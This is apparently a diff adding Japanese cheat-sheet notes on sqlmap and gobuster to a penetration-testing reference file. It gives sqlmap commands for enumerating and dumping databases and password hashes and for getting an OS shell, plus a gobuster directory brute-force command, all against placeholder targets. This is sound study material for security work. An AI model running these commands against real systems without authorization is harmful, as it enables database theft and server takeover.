@@ -864,3 +864,119 @@ hashdump
 # ファイル検索
 search -f [対象ファイル名]
 ```
+
+## Sqlmap
+
+### 基本コマンド
+
+- -u URL, --url=URL = URL: ターゲットURL（例： "http://www.site.com/vuln.php?id=1"）
+- --data=DATA: - POSTを介して送信されるデータ文字列（例： "id = 1"）
+- --random-agent: ランダムに選択されたHTTPUser -Agentヘッダー値を使用する
+- -p TESTPARAMETER: テスト可能なパラメータ
+- --level=LEVEL: 実行するテストのレベル（1-5、デフォルト1）
+- --risk=RISK: 実行するテストのリスク（1-3、デフォルト1）
+
+### 列挙コマンド
+
+- -a, --all: すべてを取得する
+- -b, --banner: DBMSバナーを取得する
+- --current-user: DBMSの現在のユーザーを取得
+- --current-db: DBMSの現在のデータベースを取得する
+- --passwords: DBMSユーザーのパスワードハッシュを列挙する
+- --dbs: DBMSデータベースを列挙する
+- --tables: DBMSデータベーステーブルを列挙します
+- --columns: DBMSデータベーステーブルの列を列挙します
+- --schema: DBMSスキーマを列挙する
+- -dump: DBMSデータベーステーブルエントリをダンプします
+- --dump-all: すべてのDBMSデータベーステーブルエントリをダンプします
+- --is-dba: DBMSの現在のユーザーがDBAであるかどうかを検出します
+- -D [DB NAME]: 列挙するDBMSデータベース
+- -T [TABLE NAME]: 列挙するDBMSデータベーステーブル
+- -C COL: 列挙するDBMSデータベーステーブルの列
+
+### OSアクセスコマンド
+
+- --os-shell: インタラクティブなオペレーティングシステムシェルのプロンプト
+- --os-pwn: OOBシェル、Meterpreter、またはVNCのプロンプト
+- --os-cmd = OSCMD: オペレーティングシステムコマンドを実行する
+- --priv-esc: データベースプロセスのユーザー特権の昇格
+- --os-smbrelay: OOBシェル、Meterpreter、またはVNCのワンクリックプロンプト
+
+### Sqlmapその他コマンド
+
+- --sql-shell: SQLプロンプト
+- --dbms=DBMS: MySQL等で絞り込み
+
+### Sqlmapサンプル
+
+#### HTTP GETベース
+
+```bash
+sqlmap -u https://testsite.com/page.php?id=7 --dbs
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
+sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
+```
+
+#### HTTP POSTベース
+
+- リクエスト内容をtxt等で保存する
+
+```bash
+sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
+sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+sqlmap -r req.txt -p -D <database_name> --dump-all
+```
+
+```bash
+# 存在するURLを調査
+gobuster dir -u [target IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# 存在するURLにSQLインジェクション
+sqlmap -u [target URL] --current-user # DBのカレントユーザを取得
+sqlmap -u [target URL] --dbs # DB名を取得
+sqlmap -u [target URL] -D [DB name] --tables # テーブル名を取得
+sqlmap -u [target URL] -D [DB name] -T [Table name] --dump # テーブル内容を酒盗
+```
+
+## Gobuster
+
+### Gobuster便利なフラグ
+
+| Flag |   Long Flag   |                 Description                  |
+| ---- | ------------- | -------------------------------------------- |
+| -t   | --threads     | 同時スレッド数（デフォルトは10）             |
+| -v   | --verbose     | 冗長出力                                     |
+| -z   | --no-progress | 進行状況を表示しない                         |
+| -q   | --quiet       | バナーやその他のノイズを印刷しないでください |
+| -o   | --output      | 結果を書き込む出力ファイル                   |
+
+#### dirモード
+
+| Flag |        Long Flag         |                           Description                           |
+| ---- | ------------------------ | --------------------------------------------------------------- |
+| -c   | --cookies                | リクエストに使用するCookie                                      |
+| -x   | --extensions             | 検索するファイル拡張子                                          |
+| -H   | --headers                | HTTPヘッダーを指定します, -H 'Header1: val1' -H 'Header2: val2' |
+| -k   | --no-tls-validation      | TLS証明書の検証をスキップする                                   |
+| -n   | --no-status              | ステータスコードを印刷しないでください                          |
+| -P   | --password               | Basic認証のパスワード                                           |
+| -s   | --status-codes           | 正のステータスコード                                            |
+| -b   | --status-codes-blacklist | 負のステータスコード                                            |
+| -U   | --username               | Basic認証のユーザー名                                           |
+
+```bash
+gobuster dir -u [target IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+#### dnsモード
+
+| Flag |  Long Flag   |                                 Description                                 |
+| ---- | ------------ | --------------------------------------------------------------------------- |
+| -c   | --show-cname | CNAMEレコードを表示する（「-i」オプションと一緒に使用することはできません） |
+| -i   | --show-ips   | IPアドレスを表示する                                                        |
+| -r   | --resolver   | カスタムDNSサーバーを使用する（server.comまたはserver.com:portの形式）      |
+
+#### vhostモード
+
+- dirモードとほぼ同じ
